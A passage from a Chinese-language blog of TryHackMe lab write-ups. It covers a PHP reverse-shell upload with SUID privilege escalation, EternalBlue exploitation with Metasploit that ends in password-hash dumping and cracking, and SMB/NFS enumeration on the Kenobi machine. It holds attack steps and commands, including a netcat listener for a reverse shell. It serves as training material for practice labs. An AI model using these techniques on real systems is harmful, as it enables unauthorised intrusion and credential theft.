<p>在此处下载以下反向 <a target="_blank" rel="noopener" href="https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php">PHP shell</a>。</p>
<p>要远程访问此计算机，请按照下列步骤操作：</p>
<ol>
<li>编辑 php-reverse-shell.php 文件并将 ip 编辑为您的 tun0 ip（您可以通过在 TryHackMe 连接设备的浏览器中访问 <a target="_blank" rel="noopener" href="http://10.10.10.10">http://10.10.10.10</a> 来获取此信息）。</li>
<li>将此文件重命名为 php-reverse-shell.phtml</li>
<li>我们现在将使用 netcat 监听传入连接。运行以下命令：nc -lvnp 1234</li>
<li>上传您的 shell 并导航到 <a target="_blank" rel="noopener" href="http://10.10.127.89:3333/internal/uploads/php-reverse-shell.phtml">http://10.10.127.89:3333/internal/uploads/php-reverse-shell.phtml</a> - 这将执行您的有效负载</li>
<li>您应该在 Netcat 会话上看到一个连接</li>
</ol>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202406031839560.png" alt="image-20240329091559947"></p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202406031839561.png" alt="image-20240329091734831"></p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202406031839562.png" alt="image-20240329092003754"></p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202406031839563.png" alt="image-20240329092015866"></p>
<h2 id="权限提升">权限提升</h2>
<p>现在您已经入侵了这台机器，我们将升级权限并成为超级用户（root）。</p>
<p>在 Linux 中，SUID（执行时设置所有者 userId）是赋予文件的一种特定类型的文件权限。 SUID 向用户授予临时权限，以在文件所有者（而不是运行它的用户）的许可下运行程序/文件。</p>
<p>例如，用于更改密码的二进制文件具有设置了 SUID 位 (/usr/bin/passwd)。这是因为要更改密码，它将需要写入您无权访问但 root 有权访问的 shadow 文件，因此它具有 root 权限来进行正确的更改。</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202406031839564.png" alt="image-20240329090026559"></p>
<p>搜索的命令为：<code>find / -perm -u=s -type f 2&gt;/dev/null</code></p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202406031839565.png" alt="image-20240329092101873"></p>
<p>这里的手法可以参考：<a target="_blank" rel="noopener" href="https://gtfobins.github.io/gtfobins/systemctl/%E4%BB%A5%E5%8F%8A">https://gtfobins.github.io/gtfobins/systemctl/以及</a> <a target="_blank" rel="noopener" href="https://cloud.tencent.com/developer/article/2238031">权限提升 | 带SUID的命令提权</a></p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202406031839566.png" alt="image-20240329093359559"></p>
<p>这里思路就是将/bin/bash命令赋值到tmp临时目录下，并且给该目录增加+s root权限，以至于后续可以以root的身份执行，不至于无权访问，当然这里也能写上bash反弹shell</p>
<p>这里也补充一个东西，找到www-data可以写入的目录</p>
<pre><code class="hljs scss">find / -type f -maxdepth <span class="hljs-number">2</span> -writable
find / -type d -maxdepth <span class="hljs-number">2</span> -writable</code></pre>
<h2 id="总结">总结</h2>
<p>这道题目思路是先常规nmap扫描，发现敏感端口，接着访问web站点，测试一波功能点发现文件上传，接着fuzz可以上传的后缀，发现phtml可以上传，之后就是上传可以反弹shell马，拿到shell之后，就是提权了，这里用到的就是suid提权。</p>
<h1 id="0x02-blue挑战">0x02 blue挑战</h1>
<h2 id="侦查">侦查</h2>
<p>扫描并了解该机器容易受到哪些攻击。请注意，该计算机不响应 ping (ICMP)，并且可能需要几分钟才能启动。这个房间并不是一个 boot2root CTF，而是一个针对完全初学者的教育系列。除了基本练习之外，专业人士在这个房间里可能不会得到什么，因为这里的过程是针对初学者的。</p>
<pre><code class="hljs scss">nmap -sV -<span class="hljs-selector-tag">p</span>- -Pn -T4 <span class="hljs-number">10.10</span><span class="hljs-selector-class">.176</span><span class="hljs-selector-class">.146</span></code></pre>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202406031839567.png" alt="image-20240329110144217"></p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202406031839568.png" alt="image-20240329110038634"></p>
<h2 id="访问获取权限">访问获取权限</h2>
<p>利用机器并站稳脚跟。</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202406031839569.png" alt="image-20240329112434427"></p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202406031839570.png" alt="image-20240329113557316"></p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202406031839571.png" alt="image-20240329113453145"></p>
<h2 id="提升权限">提升权限</h2>
<p>升级权限，了解如何在 Metasploit 中升级 shell。</p>
<p>上述可以看到存在SMB ms17-010漏洞，这里选择永恒之蓝来利用</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202406031839572.png" alt="image-20240329123902622"></p>
<p>设置好相关参数，即可直接run</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202406031839573.png" alt="image-20240329123920314"></p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202406031839574.png" alt="image-20240329123926360"></p>
<p>拿到shell之后，我们退到后台，尝试将该反弹shell转换为meterpreter类型的shell</p>
<p>搜寻一番可以发现该模块：post/multi/manage/shell_to_meterpreter</p>
<p>如下图所示，设置相关参数</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202406031839575.png" alt="image-20240329124058141"></p>
<p>直接run运行，之后会看到新增一个会话</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202406031839576.png" alt="image-20240329123812533"></p>
<p>切换到会话3，并且看到我们当前的权限就是system（NT AUTHORITY\SYSTEM）</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202406031839577.png" alt="image-20240329124202174"></p>
<p>通过命令“shell”打开 dos shell 并运行“whoami”。这应该表明我们确实是一个系统。之后将此 shell 置于后台并再次选择我们的 meterpreter 会话以供使用。</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202406031839579.png" alt="image-20240329124243103"></p>
<p>列出通过“ps”命令运行的所有进程。仅仅因为我们是系统并不意味着我们的流程是。在此列表底部找到一个在 NT AUTHORITY\SYSTEM 运行的进程，并记下进程 ID（最左列）。</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202406031839580.png" alt="image-20240329124316011"></p>
<p>如上图，这里我选择2652的进程id</p>
<p>使用“migrate PROCESS_ID”命令迁移到此进程，其中进程 ID 是您刚刚在上一步中记下的 ID。这可能需要多次尝试，迁移过程不是很稳定。如果失败，您可能需要重新运行转换过程或重新启动计算机并再次启动。如果发生这种情况，请下次尝试不同的过程。</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202406031839581.png" alt="image-20240329130230127"></p>
<p>这里也是尝试了多个进程，发现很多都显示没有权限，2912恰好符合</p>
<h2 id="破解">破解</h2>
<p>转储非默认用户的密码并破解它！</p>
<p>在我们提升的 meterpreter shell 中，运行命令“hashdump”。只要我们有正确的权限，这就会转储计算机上的所有密码。非默认用户的名称是什么？</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202406031839582.png" alt="image-20240329130403964"></p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202406031839583.png" alt="image-20240329130649628"></p>
<p>这里可以用john或者在线网站破解</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202406031839584.png" alt="image-20240329130447362"></p>
<p>这里我了解了一下上述NT格式的含义：<code>--format=NAME</code></p>
<p>name指定密文格式,指定密文格式名称,为DES/BSDI/MD5/BF/AFS/LM指定使用某种密文格式进行破解</p>
<p>具体参考：<a target="_blank" rel="noopener" href="https://doc.gui.run/docs/security_tools/security_tools-1e06j26453ols">https://doc.gui.run/docs/security_tools/security_tools-1e06j26453ols</a></p>
<h2 id="寻找flag">寻找flag</h2>
<p>找到这台机器上插着的三面旗帜。这些不是传统的标志，而是代表 Windows 系统中的关键位置。使用下面提供的提示来完成这个房间！</p>
<p>标志1：该标志可以在系统根目录中找到。</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202406031839585.png" alt="image-20240329131447799"></p>
<p>标志2：该标志可以在 Windows 中存储密码的位置找到。</p>
<p>勘误表：Windows 确实不喜欢此标志的位置，并且偶尔会删除它。在某些情况下，可能需要终止/重新启动计算机并重新运行漏洞利用程序才能找到此标志。这种情况相对罕见，但也有可能发生。</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202406031839586.png" alt="image-20240329131618845"></p>
<p>位置存在于Windows的system32下的config目录下</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202406031839587.png" alt="image-20240329131612265"></p>
<p>标志3：这面旗帜可以在一个绝佳的位置找到，可以进行掠夺。毕竟，管理员通常会保存一些非常有趣的东西。</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202406031839588.png" alt="image-20240329131822411"></p>
<h2 id="总结">总结</h2>
<p>依旧是nmap扫描，发现敏感端口445，联想到永恒之蓝，直接msf exploit，发现成功，接下来为了方便，想办法将该shell转变为meterpreter shell，选择post中的某个模块，成功转换，接着就是提权，采用migrate 进程ID来提权，迁移进程成功之后，就提升了权限，接下来就是找敏感文件：比如根目录、Windows\system32\config目录，以及用户对应的document目录</p>
<h1 id="0x03-kenobi挑战">0x03 Kenobi挑战</h1>
<p>有关利用 Linux 机器的演练。枚举 Samba 共享、操纵 proftpd 的易受攻击版本并通过路径变量操纵来升级您的权限。</p>
<p>本会议室将介绍访问 Samba 共享、操纵 proftpd 的易受攻击版本以获得初始访问权限以及通过 SUID 二进制文件将您的权限升级为 root。</p>
<h2 id="枚举samba共享">枚举Samba共享</h2>
<p>Samba 是适用于 Linux 和 Unix 的标准 Windows 互操作程序套件。它允许最终用户访问和使用公司内部网或互联网上的文件、打印机和其他常用共享资源。它通常被称为网络文件系统。</p>
<p>Samba 基于服务器消息块 (SMB) 的通用客户端/服务器协议。 SMB 是专门为 Windows 开发的，如果没有 Samba，其他计算机平台就会与 Windows 机器隔离，即使它们是同一网络的一部分。</p>
<p>使用 nmap 我们可以枚举 SMB 共享的机器，Nmap 能够自动运行各种网络任务。有一个脚本可以枚举共享！</p>
<pre><code class="hljs scss">nmap -<span class="hljs-selector-tag">p</span> <span class="hljs-number">445</span> <span class="hljs-attr">--script</span>=smb-enum-shares<span class="hljs-selector-class">.nse</span>,smb-enum-users<span class="hljs-selector-class">.nse</span> <span class="hljs-number">10.10</span><span class="hljs-selector-class">.67</span><span class="hljs-selector-class">.234</span></code></pre>
<p>SMB 有两个端口：445 和 139。</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202406031839589.png" alt="image-20240404083553034"></p>
<p>首先nmap常规扫描：<code>nmap -sS -sV -p- -T4 10.10.67.234</code></p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202406031839590.png" alt="image-20240404085252080"></p>
<p>这里有点不清楚，为何答案是7个端口，用了hint的 nmap命令，发现还真是7个，有点不理解（可能是我全端口扫描的缘故吧）</p>
<blockquote>
<p>Samba监听端口有：TCP和UDP------tcp端口相对应的服务是smbd服务，其作用是提供对服务器中文件、打印资源的共享访问；udp端口相对应的服务是nmbd服务，其作用是提供基于NetBIOS主机名称的解析。</p>
<p>nmap有一个用于枚举SMB共享的脚本，使用 nmap，我们可以枚举一台机器的SMB 共享。</p>
</blockquote>
<p>继续找SMB的共享：<code>nmap -p 445 --script=smb-enum-shares.nse,smb-enum-users.nse 10.10.67.234</code></p>
<pre><code class="hljs scss">#也可以使用以下命令：smbclient -L \\\\<span class="hljs-number">10.10</span><span class="hljs-selector-class">.54</span><span class="hljs-selector-class">.34</span>\\</code></pre>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202406031839591.png" alt="image-20240404090738579"></p>
<p>使用smbclient命令，匿名连接目标机的SMB共享，查看共享系统上存在什么文件</p>
<pre><code class="hljs scss">smbclient <span class="hljs-comment">//10.10.67.234/anonymous #这里不用输入密码直接进入即可</span></code></pre>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202406031839592.png" alt="image-20240404091212561"></p>
<p>看到这里存在一个log.txt文件。你可以使用smbget命令，通过匿名用户 递归地下载整个SMB 共享，共享系统中的文件将会被下载到本地</p>
<pre><code class="hljs scss">smbget smb://<span class="hljs-number">10.10</span>.<span class="hljs-number">67.234</span>/anonymous/log.txt</code></pre>
<p>这里的smbget命令出问题了，说是解析顺序不正确，看了文章去改配置文件smb.conf但是没找到相关选项，真是服了，看了官方文档也没有效果。这里我就无奈指定文件下载了，-R选项用不了。。。。</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202406031839593.png" alt="image-20240404093624692"></p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202406031839594.png" alt="image-20240404093803550"></p>
<p>查看来自共享系统的log.txt文件内容，我们可以获取两个信息：</p>
<ul>
<li>为Kenobi用户生成 SSH 密钥时的信息–Kenobi用户的ssh密钥–保存在/home/kenobi/.ssh路径下</li>
<li>有关 ProFTPD 服务器的信息（ 运行FTP服务的用户是 Kenobi）</li>
</ul>
<p>之前的端口扫描显示了 端口111正在运行rpcbind服务，rpcbind是一个将远程程序调用(RPC-- remote procedure call)的程序号转换为通用地址的服务器。当一个RPC 服务启动时，它会告诉 rpcbind 它正在监听的地址以及它准备启用的服务所对应的RPC程序编号。</p>
<p>查看本例中端口111的nmap扫描信息，可以发现nfs（network file system）服务被远程启用，接下来尝试枚举nfs信息：</p>
<pre><code class="hljs scss">nmap -<span class="hljs-selector-tag">p</span> <span class="hljs-number">111</span> <span class="hljs-attr">--script</span>=nfs-ls,nfs-statfs,nfs-showmount <span class="hljs-number">10.10</span><span class="hljs-selector-class">.67</span><span class="hljs-selector-class">.234</span></code></pre>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202406031839595.png" alt="image-20240404094449466"></p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202406031839596.png" alt="image-20240404094504261"></p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202406031839597.png" alt="image-20240404094507914"></p>
